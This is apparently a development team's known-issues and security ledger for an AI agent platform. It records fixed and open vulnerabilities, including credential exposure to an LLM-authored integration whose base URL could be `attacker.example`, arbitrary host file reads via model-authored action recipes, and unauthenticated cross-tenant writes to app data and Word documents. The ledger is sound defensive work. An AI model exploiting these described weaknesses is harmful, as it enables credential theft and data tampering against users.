  binding to `stripe.com`). The api_call executor checks AFTER interpolation and BEFORE the
  request, so a refused destination never sees the credential; the refusal does not echo the
  attacker-chosen URL into the persisted record. The interim binding is derived from the
  integration's own declared base URLs via a fail-closed seam
  (`setIntegrationOriginResolver`); Cofre per-item `boundOrigins` replaces the derivation in WS-C
  without moving the enforcement point. `action-executor.ts` now also goes through `guardedFetch`.
  Pinned by `api/tests/security/origin-binding.test.ts` (20 cases) and
  `api/tests/security/api-call-origin-binding.test.ts` (8 cases through the real executor).
- **`integration-package-baseurl-unreviewed`** (OPEN, HIGH, confidentiality — raised while fixing
  R-2). A user-defined integration package's `httpConfig.baseUrl` is written VERBATIM from an
  LLM-authored `config.json` (`routes/integration-builder.ts:210` →
  `integrations/definitions.ts` `writeRuntimePackage`), and the owner's decrypted credential is
  injected into requests against it. R-2 put that path behind the SSRF guard, which stops it
  reaching internal infrastructure, but origin binding CANNOT fix it: the allowlist for a package
  is derived from the package's own declared host, so binding it to itself is tautological. A
  package that declares `baseUrl: https://attacker.example` is therefore still able to receive the
  credential it is configured with. This is a PROVENANCE problem — the fix is an approval gate on
  the declared host when a package is created or edited (and, later, the Cofre grant ceremony
  naming the host the user is consenting to). Deliberately not closed inside R-2 because it needs a
  user-facing approval surface, not a filter.
- **`ekoa-action-unsandboxed-fs`** (FIXED 2026-07-27, CRITICAL, confidentiality + integrity — Cofre
  discovery gate R-1). `resolveUserPath` in `api/src/automation/platform-primitives.ts` applied no
  containment whatsoever — `if (isAbsolute(path)) return path;`, with the comment "trust user-issued
  paths via Ekoa actions, since manifests are authored by the coding agent under our control". That
  premise is false in both directions: the recipe is MODEL-authored (I5) and `rehearsal.ts` lets the
  mid-run fixer LLM choose which capability runs. `file.read` of any absolute path put the bytes in
  `ctx.captured`, which is persisted as `capturedValues` and returned by `extractActionRunOutput`
  into the calling agent's tool result (I1/I2/I4); `file.write` was equally unrestricted. Because
  `ekoa_action` executes CLOUD-side with no daemon dependency, this ran on the API host today.
  FIXED by `api/src/security/path-containment.ts` — a copy-with-review of the daemon's ADR-001
  resolver (real-path checked, symlink-escape proof, write-safe for not-yet-created leaves) — rooted
  at a per-owner `<dataDir>/action-workspace/<orgId>/<userId>`, plus a credential-bearing denylist
  applied to the REAL path so a benign label cannot launder `~/.ssh/id_rsa`. `~` now means the
  workspace root, not the host home directory. An absolute host path is REFUSED rather than
  silently reinterpreted as root-relative (that reinterpretation was a first-cut defect of this fix,
  caught by its own test: it turned a containment breach into a confusing ENOENT).
  Pinned by `api/tests/security/action-path-containment.test.ts` (32 cases) and
  `api/tests/security/action-file-primitives.test.ts` (11 cases, through `executeRecipe`).
- **`redaction-masker-leak`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate R-6).
  Two divergent private copies of the value-keyed masker existed, each leaking in a different way,
  and BOTH silently skipped any secret shorter than four characters — the failure mode a masker must
  never have, because a value that is quietly not masked reads exactly like one that was.
  `integrations/http-template.ts`'s `maskValue` emitted `***…1234`, a persisted plaintext SUFFIX of
  every credential the platform ever proxied; `automation/executors/api-call.ts` masked to
  `<redacted>` with no leak but matched only the RAW literal, so a URL-encoded, base64 or
  JSON-escaped occurrence walked straight into the persisted step record. FIXED by
  `api/src/security/redaction.ts`: a run-scoped `SecretRegistry` substituting `[REDACTED:<handle>]`
  (no plaintext fragment, no length hint) across raw / URL-encoded / base64 / base64url /
  JSON-escaped forms, longest-value-first, case-folded above 8 chars. Both copies are now thin
  callers. Sub-3-char values are still not substituted — doing so would destroy the surrounding
  stream — but they are surfaced on `registry.unmaskable` instead of being dropped in silence.
  Pinned by `api/tests/security/redaction.test.ts` (24 cases, one per regression).
- **`citius-listener-blocked`** (OPEN, MEDIUM, correctness — 2A-S4 review). `citius` is the one
  SHIPPED user-defined listener source that is not deferred for a missing transport, and it still
  cannot poll. 2A-S4 fixed the part that belonged to the listener rail (the composition root now
  injects the automation seam into the executor the supervisor uses, guarded by a static test, and
  the poll unwraps the automation run envelope so the package's `listenerConfig` paths resolve
  against the action's own output). TWO blockers remain, neither of them the rail's and neither
  silent — the listener fails loudly on every tick with the exact reason on its failure counter:
  (1) `automationBinding.automationId` is the template placeholder `citius-<template>-template`,
  which no lookup resolves; ekoa-dev rewrote that id to the per-owner provisioned id inside the
  USER SANDBOX COPY of the package (integration-storage.ts), and ekoa-code deliberately descoped
  per-user sandbox packages, so the shipped binding never matches the org's provisioned automation
  (`managedAutomationId(key, templateKey)` = `citius-<template>`). The failure surfaces as
  `unknown_automation: citius-notificacoes-template`. This equally breaks the automation
  `integration` step, i.e. it is NOT specific to the listener rail; two committed assertions
  currently pin the placeholder value (`api/tests/contract/integration-definitions.test.ts`,
  `api/tests/e2e/citius-integration.e2e.mjs`), so the fix (resolve the bound id via the
  deterministic managed id, or re-point the shipped package and both assertions) is a deliberate
  separate change. (2) The CITIUS captured browser session does not exist yet — `session-capture.ts`
  is track 2A slice 6 — so even a resolvable automation cannot authenticate to the Portal dos
  Mandatários. Close with 2A-S6 plus the id fix.
- **`event-array-field-shape-drift`** (OPEN, LOW, correctness — 2A-S4 review note). Both poll
  sources treat a non-array `eventArrayField` as an empty batch (`asArray` returns `[]`), so a
  provider that changes the shape of that field advances the cursor over items that were never
  read. Identical in `platform-poll.ts` (approved at 2A-S1) and in ekoa-dev, so it is recorded here
  rather than changed inside a slice: the honest fix is to distinguish "absent/array" (a real empty
  batch) from "present but not an array" (a shape change ⇒ stall the cursor and report it).

- **`insolvencia-watch-at-least-once`** (OPEN, LOW, quality — run 20260717-190134 E4). The Citius
  insolvência polling watcher persists a seen-ref after each durable watch.hit emit, but the
  emit-then-persist is at-least-once not atomic: if `updateWatch` itself fails after the event
  write, that one publication can re-emit a duplicate dossiê timeline entry on the next poll (never
  data loss, never cross-org). The seenRefs cap (500 newest) likewise assumes the portal's active
  window stays under the cap. Both are documented v1 limits (fixture-driven; the real-portal use is
  the attended signed-in-connector follow-up run per BRIEF §8 run-2 note); a windowed cursor +
  idempotent event write is the follow-up hardening.

### Part B live proof + walkthrough (run 20260717-190134-9d4c1cbf)

- **`answer-channel-preamble-leak`** (OPEN, MEDIUM, quality). A live chat turn's sheet revision 1
  contained model-internal English preamble ("This is taking too much effort... grep approach...")
  as part of the ANSWER text (no tool boundary separated it, so the transport classification is
  correct - the model narrated inside its answer turn). PT-facing product shows English internals.
  Candidate fixes: answer-shaping instruction in the chat agent context, or a narration-shaped
  head heuristic feeding the thinking channel. Found by the B7 walkthrough vision pass.
- **`knowledge-tool-sync-io-stall`** (OPEN, MEDIUM, perf). Knowledge tool calls block the api
  event loop for multi-second stretches (observed ~3s+ per call during B7 debugging; it stalled
  SSE keep-alives long enough to 502 the old dev proxy). Async/offload candidate.
  **Addendum (C7 voice proof, run 20260717-190134-9d4c1cbf):** the blast radius is wider than
  the SSE-keepalive framing above - the SAME stall was observed delaying an entirely UNRELATED
  live WebSocket connection's server-side message processing (the voice relay's stub STT
  responding to a marker frame) by 9-18s while a concurrent chat run's agent work (tool calls)
  was in flight on the SAME api process. Confirms this is a genuine event-loop-wide stall, not
  scoped to the requesting HTTP/SSE connection - worth weighting into the fix's priority.
- **`context-block-hold-back-leak`** (FIXED 2026-07-18, run 20260717-190134-9d4c1cbf closing security review). Found by the
  C7 voice proof (run 20260717-190134-9d4c1cbf) while driving a real TALKING-mode turn end to
  end: the model's internal `<ekoa-context>{...}</ekoa-context>` state-tracking block (ch05
  §5.7.2, `api/src/agents/markers.ts` `CONTEXT_OPEN`/`CONTEXT_CLOSE`) partially LEAKED onto the
  live `text_chunk` wire and was consequently spoken aloud via the voice pipeline's TTS `say`
  (observed verbatim: `<ekoa-context>\n{"userGoal": "...", "knownContext": [], ...`). The
  persisted (final, authoritative) assistant message was clean - `MarkerProcessor.end()`'s full
  final pass correctly stripped the block from the PERSISTED text - so this WAS a LIVE-STREAM-ONLY
  leak, not a persistence-layer defect. Root cause (read, not yet fixed):
  `MarkerProcessor.drain()`'s split-marker hold-back (`HOLD_BACK = MAX_MARKER_LEN - 1`, ~14 chars)
  protects a MARKER LITERAL (e.g. `<ekoa-context>` itself) from splitting across a chunk
  boundary, but does NOT protect an OPEN-but-not-yet-CLOSED context block's UNBOUNDED body: once
  `<ekoa-context>` has opened and its close tag has not yet arrived, `stripSignals()`'s context
  loop can only wait (`if (close === -1) break`), while `drain()`'s hold-back releases everything
  except the last ~14 characters of the buffer regardless - so as soon as the open tag + body
  grows past the hold-back window (very plausible: the body is a small JSON object, easily
  >14 chars, and can arrive over several deltas while the model keeps generating), the excess
  streams to the wire as if it were safe prose. This affects the ORDINARY (non-voice) chat
  transcript too - text_chunk is the same wire regardless of modality - but no existing test
  scans transcript content for the literal `<ekoa-context>` substring (existing marker tests use
  a short FIXED marker split across exactly two chunks, not an unbounded, late-closing block), so
  it went unnoticed until the voice pipeline made the leak audible. Likely fix direction: track
  "inside an open, unclosed context block" as buffer state and hold back from the open tag
  forward (not just the trailing HOLD_BACK window) until the close tag resolves it. Out of C7's
  scope (agents/markers.ts is shared chat-pipeline infrastructure, not voice-specific); a
  dedicated fix + regression test (a context block whose body exceeds HOLD_BACK, split across
  many small deltas) is owed.
  FIX: `api/src/agents/markers.ts` `drain()` now holds back from an unclosed `<ekoa-context>` open tag (not just the fixed ~marker-length tail) until its close arrives, so the block's body never streams to the live `text_chunk` wire; stripSignals then removes the complete block. Regression-pinned in `api/tests/agents/markers.test.ts` (a split open-block delta whose body must not appear in the live emission). Verified: markers + transport + chat suites 43/43.
- **`chip-title-raw-first-line`** (OPEN, LOW, polish). The composer chip renders the sheet's raw
  first line when no model title exists yet; once reply_summary lands the sheet has a title the
  chip could prefer.

### Cortex gateway (run 20260717-071930-d1244839)

- **`gateway-anon-tooluse-fidelity`** (OPEN, HIGH - found by S6 live proof; a top follow-up item;
  CONFIDENTIALITY dimension added by the run-level security review 2026-07-17). The EXACT deny-listed
  literal never leaks - egress tokenization deep-walks tool_result/tool_use string leaves and is
  fail-closed, so a deny-listed literal in an `ls` output is tokenized before it crosses the wire.
  BUT the run's own live evidence shows the literal comes back to the client MANGLED across turns
  (`ZarkovH90305` -> `ZarkovH9305`, a dropped digit); the deny-list is matched LITERALLY, so the
  corrupted variant is NOT re-tokenized when the CLI feeds it back as a tool_result (e.g. a
  "no such file: ZarkovH9305" error) - a near-miss of the secret literal can then egress to the
  PROVIDER in cleartext (partial, not full, disclosure - to the very party §17.4(b) withholds it
  from; NOT a cross-tenant leak). The re-egress step is inferred from the code path, not yet
  reproduced live - a targeted repro is owed before sizing. Deny-list orgs only; empty-ruleset is a
  proven no-op. The deeper anonymisation-plane fix direction is unchanged; this note re-classes it
  so it is not deprioritised as merely cosmetic.
  With a NON-empty deny-list, a stock Claude Code session cannot reliably navigate a filesystem
  whose paths contain a deny-listed literal: the tokenized directory name that reaches the model in
  a `tool_result` (an `ls`/`find` output) does not reliably detokenize back in the model's next
  `tool_use` argument, so the CLI tries to open the FAKE path and reports "directory not found", or
  the literal comes back mangled across calls (observed: `ZarkovH90305` -> `ZarkovH9305`, a dropped
  digit). This survives the S7 stable-vault fix (tokens are now consistent turn-to-turn), so the
  residual is DETOKENIZATION FIDELITY of `tool_use` argument blocks under the tool_use/tool_result
  density that coding traffic exercises and bridge traffic never did - exactly the brief's §3
  anticipated risk ("coding traffic exercises tool_use/tool_result density the bridge traffic never
  did"). The EMPTY-ruleset case is a true no-op and lands byte-identical (proven live), so ONLY
  deny-list orgs doing filesystem work through Claude Code are affected. Fix is a deeper
  anonymisation-plane change (reliable whole-token detokenization of tool_use args when the model
  reformats/splits a format-preserving fake, plus overlapping deny-list x structured-ID x NER span
  resolution) - a dedicated follow-up run, NOT bolted onto the S6 proof driver. The S6 driver
  records this as an honest KNOWN LIMITATION (never green-washed).

- **`gateway-vault-per-request-instability`** (FIXED by S7, commit bdbc472/d783f7d/31309d9). On the
  gateway path a stock Anthropic client (Claude Code) sends no `metadata.session_id`, so
  `proxyGatewayMessages` opens a FRESH ephemeral vault per request (`sess_${correlationId}`). Vault
  tokens are minted per-class by sequence and are deterministic only WITHIN one vault, so across
  Claude Code's agentic tool loop (each tool step is a separate gateway request) a deny-list literal
  in a filesystem path tokenizes inconsistently and a prior turn's token fails to detokenize - the
  CLI then sees a directory that "does not exist" and the tool loop fails in confusing ways (exactly
  the brief's §3 anticipated failure). The EMPTY-ruleset round trip is a true no-op and lands
  byte-identical (proven live), so only deny-list orgs are affected. Fix (S7): derive a STABLE
  session key for a gateway principal without an explicit session_id (the gateway keyId), so one
  Claude Code session shares one vault (30-min TTL) and tokens stay stable across the loop.

### Contract / schema drift (the schema-coverage honor-system class)

- **`schema-coverage-honor-system`** (structural). The schema-coverage gate is a hand-maintained
  allowlist that does NOT verify a test exercises each COVERED endpoint; a green gate is not proof a
  body matches its schema. Audit 2026-07-10 found 27 of 154 COVERED keys unexercised and ~6 endpoint
  groups returning schema-violating bodies. The three items below are instances. Real fix: a run-wide
  registry of actually-exercised schemas (specified, unimplemented). Tracked: `docs/testing.md`.
- **`llm-classify-contract`** (medium). `ekoaLocal.llmClassify` handler emits no `category` and reads
  `req.body.prompt`, diverging from the contract input shape; a compliant client gets a schema-
  violating response.
- **`triggerView-active-drop`** (minor). `triggerView` drops the `active`/disabled field (optional
  field silently omitted), so trigger state is invisible to a schema-strict client.
- **`view-timestamps-drop`** (minor). `memoryView` and `artifactView` omit `createdAt`/`updatedAt`
  (optional-drop).
- **F14** (harness-gap, minor). The served-app owner bypass accepts both `Authorization: Bearer` and
  `?token=`; the committed suite asserts only `?token=`. Untested accepted-auth surface.
- **`artifact-cards-invalid-date`** (minor, UX). The expanded "Os Meus Artefactos" cards render
  "Invalid Date" in the date row for every featured artifact (observed live 2026-07-12 on a fresh
  dev stack, all 41 cards). Likely the card formats a missing/differently-shaped timestamp on
  seeded featured artifacts (`createdAt`/`updatedAt` absent or non-ISO) straight through
  `new Date(...)`. Fix: tolerate absent timestamps (hide the row) and add a regression assertion
  that no card ever renders the literal "Invalid Date".
- **`ai-integration-lands-under-platform-tab`** (minor, UX). An AI-built integration saved via the
  chat builder (e.g. open-library, e2e-proof-weather, openweathermap) renders under
  `/integrations?tab=plataforma` ("Integrações da Plataforma"), while "Minhas Integrações"
  (`?tab=minhas`) shows the empty state - so a user who just built an integration and looks under
  "Minhas Integrações" does not find it (confusing). It is available to the org (works), just filed
  under the wrong tab for its provenance. Observed live 2026-07-11. Likely the "mine" filter keys on
  a config/credential-instance concept rather than `userCreated` runtime definitions. Decide the
  intended split and route userCreated runtime defs to the "mine" tab (or relabel the tabs).
- **`integration-handoff-spurious-build`** (medium, UX). Confirming a chat integration offer (the
  two-turn `[[EKOA_INTEGRATION_BUILD]]` handshake) reliably ALSO spawns a real app-build job that
  runs the coding agent with an effectively-empty task and terminates `BUILD_UNFULFILLED` ("A
  construção não chegou à aplicação servida"). Observed live 2026-07-11 for both rest-countries and
  open-library: the integration panel opens and generates+saves correctly (proven — the integration
  lands on `/integrations` with its actions), but the chat column shows a spurious failed build
  alongside it. The build job carries a jobId (server-created) yet no `Vou ligar essa integração
  primeiro.` message precedes it, so it is NOT the build-path in-build classifier; and the client
  `isBuildSession` gate is false on a fresh chat session, so the client message router did not kick
  it — the spurious `build_intent` originates in the server marker orchestration when the
  confirmation turn is classified. Not blocking (the integration still saves) but pollutes the
  handoff. Close by tracing the turn-2 emission: the chat run must emit ONLY the integration signal
  (or, if it emits both, integration must win over build in `agents/chat.ts` — currently build is
  checked first). Add a deterministic test asserting one signal per confirmation turn.

- **`served-app-data-unauthenticated-writes`** (HIGH, pre-existing, operator decision - surfaced by
  H5's destructive-action-authz assertion). The served-app data plane `/api/app-data/:collection`
  authenticates NOTHING about the CALLER: `served-data.ts` `scopeFor()` requires only a well-formed
  `X-Ekoa-App-Id` header + the app OWNER's activation, then scopes to that app's partition. So ANY
  caller who knows an app id/slug can `POST`/`PUT`/`DELETE` that app's data ACROSS TENANTS (a private
  org app's data can be tampered/deleted by an outsider who learns its id). Two compounding facts:
  (1) the manifest collection-rule `access:{ write:'session'|'server' }` is DECLARED but NOT enforced
  by served-data.ts (the write mode is decorative); (2) the app-sso session cookie is
  `Path=/api/app-sso`, so it is not even sent to `/api/app-data` - there is no session to check at
  that path today. NOT introduced by the operator-run (C3/D-era served-app data plane); on a
  DIFFERENT axis from the platform role/capability layer H1-H4 close (which is complete). Phase 10's
  "destructive-action authorization asserted server-side" is NOT met for this surface. FIX (an
  operator architecture decision, a dedicated post-H slice): enforce the declared collection write
  mode and make an app-sso session verifiable at the data path (widen the app-sso cookie path or mint
  a session token the data plane checks); `write:'server'` collections should reject ALL client
  mutations. Pinned as a TRIPWIRE in `api/tests/security/destructive-action-authz.test.ts` (a fix
  flips the test) + behaviorally green today in `api/tests/contract/served-app.test.ts`. Tracked in
  `docs/security.md`.

  **Surface extension 2026-07-24 (2C-S4, `/api/app-docx/*`).** The same posture now also exposes the
  owner's SOURCE WORD DOCUMENT. `api/src/apps/app-docx.ts` mirrors app-files' `admitApp` (mandated
  for consistency), so it too authenticates NO caller - only a well-formed `X-Ekoa-App-Id` plus the
  resolved OWNER's activation. Consequently any caller who knows an app id/slug can: read the full
  document text via `GET /api/app-docx/projection`, download the raw bytes via `GET
  /api/app-docx/current` and `POST /api/app-docx/clean`, and **persist mutations** via `POST
  /api/app-docx/edits` (accept/reject/comment/reply/resolve). Aggravating factor specific to this
  surface: `apps/document-source.ts` `applyReview` resolves the author SERVER-SIDE from the artifact
  owner, so an anonymous outsider's tracked changes and comments are written into a legal `.docx`
  **attributed to the lawyer** (the owner's username), with no record that the caller was not them.
  Remanence: `deleteArtifact` (`api/src/apps/artifacts-service.ts`) removes only the artifact row and
  not the app's data dir - afterwards `resolveApp` returns null, `artifactBacked` is false, the
  owner-activation gate is SKIPPED entirely, and the orphaned document under
  `<EKOA_DATA_DIR>/app-data/{appId}/docx` remains readable and mutable to anyone holding the id. Same
  root cause and same operator decision as the parent entry (no separate fix timeline); a caller/
  session check on the served-app planes closes both. Current state PINNED as a tripwire in
  `api/tests/security/app-docx-authz.test.ts` so a future hardening flips it visibly.

### Gateway / egress

- **`gateway-502-masks-401`** - CLOSED (local-bridge consumer run s7, 2026-07-11, merged from the
  parallel session): typed `CredentialError` -> 503 `credential_error` (non-retryable), rate-cap ->
  429, transient stays 502; `/health claudeAuth.lastProviderError` carries class+timestamp only;
  gateway metadata is an allowlist (`user_id` only), killing the sibling mask.
- **`health-bridgeConnections-mismatch`** (small, merged from the parallel session's recon). `/health
  bridgeConnections` reports `sseManager.connectionCount` (SSE clients), not the bridge registry's
  daemon-socket count the field name promises. One-line fix in server.ts /health + a health contract
  assertion.
- **`e2e-estate-no-committed-env`** (open, structural; merged - extends `e2e-estate-baseline-13`
  below). 49 of 213 due specs red when the WHOLE ledger estate runs against the run-driver stack
  (the served-app compat `/api/v1/action` suites 404 at every commit; demo tours exceed the 30s
  timeout on dev-next latency). Needs a committed full-stack e2e harness + a compat-suite triage.
- **`gateway-apikey-checkAllowance`** (medium, security). The gateway `apikey` principal skips
  `checkAllowance` and bills the platform admin account - an exfil surface reachable from a build
  subprocess. Operator decision owed on the sanctioned posture.
- **F8** (judgment, minor). Provider/credential error surfaces are not user-grade: chat can stream an
  English spec citation, the adapter can leak raw provider JSON, and build failure is a generic PT
  sentence with no cause. Needs one error-mapping layer at the streaming sink (PT message + machine
  code, detail in logs).

### Product bugs

- **`restoreVersion-featured-500`** (medium). `restoreVersion` on a *featured* artifact still 500s.
  (The broader versions-500 - never-built artifacts and the featured list - was fixed 2026-07-11; this
  case remains.)
- **`web-sourceinput-divergence`** (medium). A web/`shared` `SourceInput` divergence makes a seed-
  template knowledge source 400 from the UI.
- **`login-double-session`** (minor, dev-only). The login landing double-creates sessions (React
  StrictMode double-mount of the eager empty-session create); dev-DB orphan-row noise, and the /chat
  landing intermittently GETs a just-created session id that 404s (the e2e trackers carry a scoped
  exclusion for exactly that 404 pattern - remove it when this closes). The write should be
  idempotent/effect-guarded.
- **`chat-sse-discovery`** (deferred, batch-2). S1 adversarial-tester discovery set: chat-SSE late-
  subscriber gap, run hangs on upstream auth failure, temp-session 404 persist.
- **`web-tests-untypechecked`** (low, batch-2). Web `__tests__` are excluded from tsc, so web test
  files are never typechecked.
- **`e2e-estate-baseline-13`** (medium, per-spec debt). The first honest full-stack estate run
  (2026-07-11, 187/200 green after this run's fixes) leaves 13 red ported specs, ALL pre-existing
  product/UI gaps (none touch this run's diffs): (a) the documented band2 legacy group still built
  around the retired `/api/v1/action` + old stubs - artifact-backend-panel, artifacts-apps-section,
  update-from-bundle, vertical-profile, onboarding x3 (REST migration owed; see
  docs/e2e-harness-remediation-brief.md); (b) integrations UI gaps - pages-manage expects a search
  input the migrated page lost, integrations-sections' Webhooks tab renders no webhook rows,
  integrations-pipedream master-toggle default/persistence semantics differ; (c) legal-content
  gaps - legal-rcbe journey, legal-shared-drift (six scaffolds vs canonical layer), simuladores-
  trabalho exact CT figures. Each is closed by building the missing surface or by an explicit
  retire decision - never by editing the ported spec.

- **`branding-tab-stale-after-research`** (minor, UI freshness). Right after a brand research
  completes, the Marca tab can render the PREVIOUS palette (local component state seeded at page
  load) while `org.branding` already holds the new one - a fresh reload shows the correct values.
  Observed live 2026-07-11 during the walkthrough recording (post-research tab showed `#1A2D5A`,
  persisted+reload truth was `#1C2B4A`). Likely the local-state sync effect on
  `settings/branding/page.tsx` not re-seeding after `fetchCompany()`. Close with a deterministic
  test that researches (fake transport), switches to the Marca tab and asserts the fresh hex.

- **`collection-rule-access-unenforced`** (medium, data-plane; H5 assertion-layer surfaced). A
  collection rule's `access:{write:'session'|'server'}` is DECLARED in the app manifest schema but
  NOT enforced by served-data.ts - all app-data writes are app-id-scoped (owner-activation
  admission), so the per-collection write mode is decorative. Pre-existing C3/data-plane concern,
  OUTSIDE the H security block (which gates the PLATFORM authz; the served-data plane is a separate,
  documented app-id-scoped design). Close by enforcing the declared write mode in served-data.ts OR
  by removing the unenforced field from the manifest schema. Flagged by H5's destructive-action-authz
  assertion (the privileged app-sso ops ARE gated + asserted; this is the general data plane).

- **`h3-edit-mode-no-cancel`** (low, UX fast-follow; H3 fresh review flagged, non-blocking). The admin
  edit-mode `running` phase (`api/assets/panel-runtime/src/edit-mode.js` / `AssistantPanel.jsx`) has
  no client-side timeout, no AbortController, and no Cancel affordance - unlike the sibling visitor
  `send()` in the same panel (which got FETCH_TIMEOUT_MS + AbortController for codex-d2). Toggling the
  edit switch OFF mid-run does not abort the in-flight `runEditPatch`, so a late resolve can flip the
  phase to `preview` with stale shas. The stale-sha CONSEQUENCE is already mitigated (the H6/codex
  fix: `guardedRollback` re-reads HEAD and refuses a stale restore), so this is a UX gap not a data
  hazard. Fast-follow: mirror the visitor path - an AbortController tied to editMode-off/unmount + a
  run-generation guard + a Cancel button. Every server action stays H1-gated regardless.

### Operator-blocked / external

- **`prod-corpus-import`** (external). The real production knowledge corpus import is pending, blocked
  on operator ssh/rsync of the staged corpus. The importer CLI and the `_shared` plane are ready
  (`docs/operations-runbook.md`).
- **`remote-tag-f25`** (operator action). The remote tag `batch1-f25` still points at the broken
  commit `8a2a67b`; re-point with `git push origin +refs/tags/batch1-f25:refs/tags/batch1-f25` (local
  is already at `af8b556`).

## Recently fixed - 2026-07-15 api runtime image defects (staging bring-up)

Three defects in the shipped api image, all of the same class - **the image builds fine but the
process fails at runtime** - all invisible to the dry-run deploy CI because that lane only *builds*
the images, never *runs* them. The first two crash at boot and were caught by a local full-stack
smoke (Caddy + api + web + mongo) before any VM spend; the third only surfaces on the first real
model turn (needs a live credential) and was caught on staging.

- **`api-phantom-dep-js-yaml`** (medium, packaging). The api imports `js-yaml` in three runtime paths
  (`automation/manifest-parser.ts`, `apps/action-manifest.ts`, `apps/tour-writer.ts`) but it was
  declared **nowhere** in `api/package.json` / root `package.json`. It only resolved because ESLint (a
  devDep) transitively hoists `js-yaml@4.3.0` to the root `node_modules`; the runtime image
  (`npm ci --omit=dev`) drops it, so `node api/dist/server.js` crashed with
  `ERR_MODULE_NOT_FOUND: Cannot find package 'js-yaml'`. **Fix:** added `js-yaml@^4.3.0` to api deps +
  `@types/js-yaml@^4.0.9` to api devDeps, and deleted the ambient shim `api/src/automation/vendor.d.ts`
  (whose own comment prescribed exactly this). A scan of the built `api/dist` against the prod-only
  dependency closure confirmed js-yaml was the **only** phantom dep.
- **`api-image-native-build-skipped`** (medium, packaging). With js-yaml fixed the api then crashed in
  `bootState` -> `backfillKnowledgeIndex` with `Could not locate the bindings file ... better_sqlite3.node`.
  `Dockerfile.api` ran `npm ci --omit=dev --ignore-scripts`, and `--ignore-scripts` skips native
  addons' install step; `better-sqlite3@12.11.1` ships **no prebuilt** for node 20 (so it must compile
  via node-gyp, which the slim image has no toolchain for). **Fix:** restructured `Dockerfile.api` with
  a dedicated `proddeps` stage that has `python3/make/g++`, installs prod deps `--ignore-scripts`, then
  `npm rebuild better-sqlite3` (compiles it); the slim runtime `COPY --from=proddeps node_modules`, so
  the toolchain never ships. Other native modules (`sharp`, `onnxruntime-node`, `@next/swc`) use
  prebuilt platform packages and were unaffected. Verified: api boots, `/health` 200, real admin login
  through the same-origin Caddy proxy, and `chromium.launch()` succeeds inside the container.
- **`api-sdk-musl-binary-picked`** (medium, packaging; surfaced by the first live model turn on
  staging). With the model credential armed, chat/build died with
  `ADAPTER_ERROR: Claude Code native binary not found at .../claude-agent-sdk-linux-x64-musl/claude`.
  `@anthropic-ai/claude-agent-sdk` ships its native `claude` binary as per-platform optional deps; npm
  installs BOTH `linux-x64` (glibc) and `linux-x64-musl` on any linux-x64 host (it filters optionals by
  os+cpu, not libc), and the SDK's resolver tries the **-musl variant first** - which cannot exec on the
  glibc bookworm image. **Fix:** `Dockerfile.api` proddeps stage now `rm -rf`s the `*-musl` variant
  packages so the resolver falls through to the working glibc binary. Verified on staging: a real chat
  turn returns `status:complete` (`"OK."`, ~4.7s) through the OAuth subscription credential + egress
  chokepoint. Note this class is invisible even to a boot smoke - a full check needs a live credential
  and one model turn.

Follow-up (recommended, not done here): add a container **boot smoke** to `deploy.yml` (run the api
image against a throwaway mongo, assert `/health` 200) so this whole class - a runtime import or native
binary absent from the shipped image - fails CI instead of first appearing on a server.

## Recently fixed - 2026-07-16 staging edge-proxy path allowlist incomplete

- **`staging-caddy-api-path-allowlist-incomplete`** (HIGH, deploy config; caught by the staging UI pass).
  The staging Caddyfile `@api` matcher routed only `/api/* /health /hooks` to the api container and sent
  **everything else** to Next (web). But the api owns a whole set of NON-`/api` browser-facing prefixes -
  the served-app pipeline `/apps/*` (the live build-**preview** iframe) and its injected runtime scripts
  `/__ekoa/*`, plus the static mounts `/artifact-screenshots/*`, `/artifact-pdfs/*`,
  `/automation-screenshots/*`, `/brand-assets/*`, and the share-link `/build/*` (all enumerated in
  `api/src/server.ts` buildApp). None were in the matcher, so each fell through to Next and returned a
  Next **HTML 404**. User-visible impact: (1) every featured/artifact card thumbnail 404'd -> blank
  cards on the home + `/artifacts` pages; (2) more seriously, `/apps/<id>/` app previews + `/__ekoa/`
  runtime were unreachable through the public origin - the core "build an app and preview it" flow was
  broken end-to-end via `staging.ekoa.io`. Loopback `http://127.0.0.1:4111` served all of these `200`,
  proving a pure edge-routing gap (not an api, seeding, or image defect). **Why it slipped:** Phase-5
  verification ran a chat turn (entirely under `/api/*`, which WAS routed) but never loaded a
  thumbnail-bearing dashboard page or an app preview through the public origin; and the dry-run deploy CI
  builds the images but never routes traffic through Caddy. **Fix:** extended `@api` to the full,
  documented allowlist (`/apps`, `/__ekoa/*`, the four static mounts, `/build`) - the Caddyfile now
  carries a source-of-truth comment mapping each prefix to its server.ts mount and stating the lockstep
  invariant. **Operational trap hit while deploying:** the Caddyfile is a single-file bind mount, which
  pins to an inode - editing it in place + `caddy reload` did NOT pick up the change (the container kept
  serving the stale inode); a `docker compose restart caddy` was required (now documented in the runbook +
  staging README). **Verified** via the public origin: all listed prefixes `200` (thumbnails `image/png`,
  `/apps/<id>/` `text/html`, `/__ekoa/*.js` `application/javascript`), web routes still reach Next, the
  `/api/v1` JSON envelope + `/health` intact, and a real-browser audit of `/` + `/artifacts` shows **0**
  broken images (41/41 and 82/82 thumbnails render) with **0** page errors. This **supersedes** the
  earlier working note that the blank thumbnails were "a fresh-staging seeding gap, not a deploy bug" -
  it was a deploy bug (the screenshots were on disk and served fine on loopback the whole time).

## Recently fixed - 2026-07-14 operator UX round (scope steering, verify narration, console noise)

- **`build-ambiguous-request-no-scoping`** (UX, operator 2026-07-14, live) - "faz uma app para
  ferias" built a personal vacation-itinerary planner with zero questions: the chat agent had no
  business-context steer and no scoping step, so ambiguous one-liners went straight to the wrong
  interpretation. Fixed in the content packs (business-scope section + ONE pre-marker scoping
  round; see decisions 2026-07-14) and pinned by a loader.test.ts canary.
- **`scaffold-copy-dev-facing`** (UX, operator 2026-07-14, live) - the app-base HomePage the end
  user watches DURING a build showed developer instructions ("Adicione páginas ao registo PAGES...
  frontend/src/pages/"). Now a user-facing PT building state ("A construir algo fantástico..." +
  pulse). data-demo-target="home-empty" and the mustEdit gate are untouched.
- **`verify-phase-silent-progress`** (UX, operator 2026-07-14, live) - the verify stage showed one
  status line then generic fillers for minutes (narration existed but landed in the COLLAPSED
  thinking block). Fixed: per-action ">> " narration contract in the verify prompt, re-emitted as
  same-status plan_steps -> live spinner label + Output tab (pinned by build.test.ts +
  verify-runner.test.ts). Two adjacent defects fixed with it: the verify scrub chain's hold-back
  tail was never flushed (final narration characters silently dropped), and the FC-505
  VerificationBanner was dead code (gated on a phase the store never received - plan_step phases
  now mirror into the store and the gate keys on 'verifying').
